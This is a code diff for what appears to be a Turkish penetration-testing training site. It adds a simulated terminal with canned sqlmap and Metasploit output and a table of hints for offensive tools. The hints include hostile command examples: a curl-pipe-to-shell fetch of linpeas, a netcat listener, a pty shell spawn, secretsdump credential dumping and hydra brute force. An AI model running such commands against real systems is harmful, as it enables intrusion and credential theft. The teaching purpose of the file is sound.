@@ -240,10 +240,127 @@ function runCmd(
       return rows;
     }
 
+    case "sqlmap": {
+      const urlArg = args.find((a) => a.startsWith("http")) ?? "http://hedef/page.php?id=1";
+      const hasDbs    = raw.includes("--dbs");
+      const hasTables = raw.includes("--tables");
+      const hasDump   = raw.includes("--dump");
+      const hasData   = raw.includes("--data");
+      const hasTamper = raw.includes("--tamper");
+      const hasR      = raw.includes("-r ");
+      const noTarget  = !raw.includes("-u") && !raw.includes("-r");
+
+      if (noTarget) return [
+        L("err",  "sqlmap: hedef belirtilmedi."),
+        L("info", '  sqlmap -u "http://10.10.10.5/page.php?id=1" --dbs'),
+        L("info", "  sqlmap -r istek.txt --batch"),
+        L("info", "Detay: /red-team/sqlmap"),
+      ];
+
+      const out: Line[] = [
+        L("info",    "sqlmap/1.7.8 — otomatik SQL injection araci"),
+        L("out",     `[*] Hedef: ${urlArg}`),
+        L("out",     "[*] Parametre test ediliyor..."),
+      ];
+
+      if (hasTamper) {
+        const t = (raw.match(/--tamper=(\S+)/) ?? [])[1] ?? "space2comment";
+        out.push(L("out",  `[*] Tamper script: ${t}`));
+        out.push(L("out",  "[*] WAF tespiti atlatıldı."));
+      }
+      if (hasData)   out.push(L("out",  "[*] POST parametreleri test ediliyor..."));
+      if (hasR)      out.push(L("out",  "[*] İstek dosyasından okunuyor..."));
+
+      if (hasDump) {
+        out.push(...[
+          L("out",     "[+] 'id' parametresi Boolean-based SQLi'ye açık"),
+          L("out",     "[*] Tablo dump ediliyor..."),
+          L("out",     "+----+----------+----------------------------------+"),
+          L("out",     "| id | username | password                         |"),
+          L("out",     "+----+----------+----------------------------------+"),
+          L("success", "| 1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 |"),
+          L("out",     "| 2  | user1    | 827ccb0eea8a706c4c34a16891f84e7b |"),
+          L("out",     "+----+----------+----------------------------------+"),
+          L("info",    "Hash kir: hashcat -m 0 hash.txt rockyou.txt"),
+        ]);
+      } else if (hasTables) {
+        out.push(...[
+          L("out",     "[+] Zafiyet tespit edildi."),
+          L("out",     "[*] 'webapp' tablolari:"),
+          L("success", "  [1] users"),
+          L("success", "  [2] products"),
+          L("success", "  [3] orders"),
+          L("info",    "Sonraki: sqlmap -u '...' -D webapp -T users --dump"),
+        ]);
+      } else if (hasDbs) {
+        out.push(...[
+          L("out",     "[+] Zafiyet tespit edildi — backend: MySQL 5.7"),
+          L("out",     "[*] Mevcut veritabanlari:"),
+          L("success", "  [1] information_schema"),
+          L("success", "  [2] webapp"),
+          L("success", "  [3] users_db"),
+          L("info",    "Sonraki: sqlmap -u '...' -D webapp --tables"),
+        ]);
+      } else {
+        out.push(L("out",  "[*] Tarama tamamlandi. Flag ekle: --dbs / --tables / --dump"));
+        out.push(L("info", "Detay: /red-team/sqlmap"));
+      }
+      return out;
+    }
+
+    case "msfconsole":
+    case "msf": {
+      return [
+        L("out",     ""),
+        L("info",    "       =[ Metasploit Framework 6.3.44 ]="),
+        L("out",     "+ -- --=[ 2373 exploits  - 1232 auxiliary ]"),
+        L("out",     "+ -- --=[ 1403 payloads  -   46 encoders  ]"),
+        L("out",     ""),
+        L("out",     "msf6 >"),
+        L("out",     ""),
+        L("info",    "Simule komutlar: search, use, set, run"),
+        L("info",    "Adim adim egzersiz icin: Gorevler sekmesi > Metasploit"),
+        L("info",    "Detayli egitim: /red-team/metasploit"),
+      ];
+    }
+
+    case "search": {
+      const q = args.join(" ").toLowerCase();
+      if (q.includes("eternal") || q.includes("ms17"))
+        return [
+          L("out", "Matching Modules"),
+          L("out", "================"),
+          L("out", "   #  Name                                      Rank"),
+          L("out", "   -  ----                                      ----"),
+          L("success", "   0  exploit/windows/smb/ms17_010_eternalblue  excellent"),
+          L("out", "   1  exploit/windows/smb/ms17_010_psexec         normal"),
+          L("info", "Sonraki: use 0  veya  use exploit/windows/smb/ms17_010_eternalblue"),
+        ];
+      if (q.includes("apache") || q.includes("2.4"))
+        return [
+          L("out", "   0  exploit/multi/http/apache_normalize_path_rce  excellent"),
+          L("out", "   1  exploit/unix/http/apache_mod_cgi_bash_env_exec  excellent"),
+          L("info", "Sonraki: use 0"),
+        ];
+      return [
+        L("out",  `[*] '${args.join(" ")}' icin sonuc aranıyor...`),
+        L("info", "Ornek: search eternalblue | search apache | search cve:2021"),
+      ];
+    }
+
+    case "use": {
+      const mod = args.join(" ");
+      return [
+        L("success", `msf6 exploit(${mod.split("/").pop()}) >`),
+        L("info",    "show options → gerekli parametreler"),
+        L("info",    "Sonraki: set RHOSTS <IP>"),
+      ];
+    }
+
     case "sudo":
       return [
         L("err",  "kali is not in the sudoers file."),
-        L("info", "💡 sudo -l ile izinleri kontrol et. GTFOBins'e bak."),
+        L("info", "sudo -l ile izinleri kontrol et. GTFOBins'e bak."),
       ];
 
     case "man":
@@ -255,9 +372,9 @@ function runCmd(
 
     case "help":
       return [
-        L("info",    "══════════════════════════════════"),
+        L("info",    "══════════════════════════════════════════"),
         L("info",    "  SEC::ACADEMY Lab — Komut Listesi"),
-        L("info",    "══════════════════════════════════"),
+        L("info",    "══════════════════════════════════════════"),
         L("success", "Navigasyon:"),
         L("out",     "  pwd / ls [-la] / cd <dir>"),
         L("success", "Dosya:"),
@@ -265,19 +382,70 @@ function runCmd(
         L("success", "Sistem:"),
         L("out",     "  whoami / id / uname -a / ifconfig / ip a"),
         L("out",     "  ps aux / netstat / date / hostname"),
-        L("success", "Ağ:"),
+        L("success", "Ag:"),
         L("out",     "  ping <ip> / nmap [opts] <ip>"),
-        L("info",    "↑↓ komut geçmişi | Ctrl+L temizle"),
+        L("success", "Guevenlik Araclari (simulasyon):"),
+        L("out",     '  sqlmap -u "http://..." --dbs'),
+        L("out",     "  msfconsole / search <modul> / use <modul>"),
+        L("info",    "Adim adim egzersiz icin Gorevler sekmesini kullan."),
+        L("info",    "Yukari/Asagi ok: komut gecmisi | Ctrl+L: temizle"),
       ];
 
     case "":
       return [];
 
-    default:
+    default: {
+      // Contextual hints for known security tools
+      const TOOL_HINTS: Record<string, { desc: string; url: string; example?: string }> = {
+        gobuster:      { desc: "Dizin/dosya tarayici",         url: "/red-team/gobuster",       example: "gobuster dir -u http://IP -w common.txt" },
+        ffuf:          { desc: "Web fuzzer",                   url: "/red-team/ffuf",           example: "ffuf -u http://IP/FUZZ -w wordlist.txt" },
+        hydra:         { desc: "Online brute force",           url: "/red-team/hydra",          example: "hydra -l admin -P rockyou.txt ssh://IP" },
+        john:          { desc: "Hash kirici (offline)",        url: "/red-team/john",           example: "john hash.txt --wordlist=rockyou.txt" },
+        hashcat:       { desc: "GPU hash kirici",              url: "/red-team/hashcat",        example: "hashcat -m 0 hash.txt rockyou.txt" },
+        nikto:         { desc: "Web zafiyet tarayicisi",       url: "/red-team/nikto",          example: "nikto -h http://IP" },
+        enum4linux:    { desc: "SMB enumeration",              url: "/red-team/enum4linux",     example: "enum4linux -a IP" },
+        responder:     { desc: "LLMNR/NTLM hash yakalama",     url: "/red-team/responder",      example: "responder -I eth0 -rdwv" },
+        bloodhound:    { desc: "AD saldiri yollari haritalama",url: "/red-team/bloodhound",     example: "bloodhound-python -c All -u user -p pass -d domain" },
+        netexec:       { desc: "Ic ag enumeration ve PtH",     url: "/red-team/netexec",        example: "netexec smb 192.168.1.0/24 -u admin -p pass" },
+        crackmapexec:  { desc: "CME — netexec eski ismi",      url: "/red-team/netexec",        example: "crackmapexec smb IP -u admin -p pass" },
+        impacket:      { desc: "Kerberos/AD araclari",         url: "/red-team/impacket",       example: "secretsdump.py domain/user:pass@IP" },
+        secretsdump:   { desc: "Credential dump",              url: "/red-team/impacket",       example: "secretsdump.py -just-dc domain/user:pass@DC" },
+        linpeas:       { desc: "Linux PrivEsc scripti",        url: "/red-team/linux-privesc",  example: "curl -sL https://linpeas.sh | sh" },
+        winpeas:       { desc: "Windows PrivEsc scripti",      url: "/red-team/windows-privesc",example: "winpeas.exe" },
+        chisel:        { desc: "Tunel/pivot araci",            url: "/red-team/pivoting",       example: "chisel server -p 8080 --reverse" },
+        proxychains:   { desc: "Proxy zinciri",                url: "/red-team/pivoting",       example: "proxychains nmap -sT IP" },
+        wpscan:        { desc: "WordPress zafiyet tarayici",   url: "/red-team/wpscan",         example: "wpscan --url http://IP -e u,p" },
+        burp:          { desc: "Burp Suite proxy araci",       url: "/red-team/burpsuite",      example: "burpsuite  (GUI acılır)" },
+        burpsuite:     { desc: "Burp Suite proxy araci",       url: "/red-team/burpsuite" },
+        wireshark:     { desc: "Paket analizi (GUI)",          url: "/network-fundamentals" },
+        metasploit:    { desc: "MSF — msfconsole yaz",        url: "/red-team/metasploit",     example: "msfconsole" },
+        python3:       { desc: "Python interpreter",           url: "/devops-fundamentals",     example: "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'" },
+        python:        { desc: "Python interpreter",           url: "/devops-fundamentals",     example: "python -c 'import pty; pty.spawn(\"/bin/bash\")'" },
+        nc:            { desc: "Netcat",                       url: "/red-team/netcat",         example: "nc -lvnp 4444" },
+        netcat:        { desc: "Netcat",                       url: "/red-team/netcat",         example: "nc -lvnp 4444" },
+        ssh:           { desc: "Uzak baglanti",                url: "/linux-fundamentals",      example: "ssh user@IP -p 22" },
+        ftp:           { desc: "FTP baglantisi",               url: "/linux-fundamentals",      example: "ftp IP  → anonymous / (bos sifre)" },
+        curl:          { desc: "HTTP istegi",                  url: "/linux-fundamentals",      example: "curl http://IP/dosya" },
+        wget:          { desc: "Dosya indir",                  url: "/linux-fundamentals",      example: "wget http://IP/dosya" },
+      };
+
+      const hint = TOOL_HINTS[cmd.toLowerCase()];
+      if (hint) {
+        const lines: Line[] = [
+          L("info",  `${cmd}: ${hint.desc}`),
+          L("info",  `Detayli egitim: ${hint.url}`),
+        ];
+        if (hint.example) lines.push(L("out", `Ornek: ${hint.example}`));
+        lines.push(L("out", "(Bu arac terminalde simule edilmiyor — egitim sayfasina git)"));
+        return lines;
+      }
+
       return [
         L("err",  `bash: ${cmd}: command not found`),
-        L("info", "💡 'help' yazarak komutları görebilirsin."),
+        L("info", "  'help' yaz — mevcut komutları gor."),
+        L("info", "  Araclari ogrenmen icin: /red-team"),
       ];
+    }
   }
 }
 
